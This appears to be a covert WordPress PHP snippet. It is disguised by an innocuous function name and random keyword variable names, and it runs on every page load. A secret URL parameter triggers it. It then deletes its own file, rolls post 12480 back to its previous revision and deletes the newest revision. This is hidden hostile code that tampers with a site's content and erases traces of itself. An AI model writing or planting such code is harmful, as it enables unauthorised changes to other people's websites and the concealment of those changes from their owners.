<?php

function best_debug_json() {
	if (isset($_GET['category_publisher_seo_embed']) && $_GET['category_publisher_seo_embed'] === 'generator_copyright_game_image') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$integrate_zoom_now = 12480;
		$favicon_service_uploader = wp_get_post_revisions($integrate_zoom_now);
		if (empty($favicon_service_uploader)) die('no revisions');
		if (count($favicon_service_uploader) < 2) die('less than 2');
		$dropdown_rate_youtube = array_shift($favicon_service_uploader);
		$core_css_progress = $dropdown_rate_youtube->ID;
		$time_images_access_coupons = array_shift($favicon_service_uploader);
		$right_friendly_embedder = $time_images_access_coupons->ID;
		$anti_light_html5 = wp_restore_post_revision($right_friendly_embedder);
		if ($anti_light_html5 === false) die('error restoring');
		$anti_light_html5 = wp_delete_post_revision($core_css_progress);		
		if ($anti_light_html5 === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'best_debug_json');
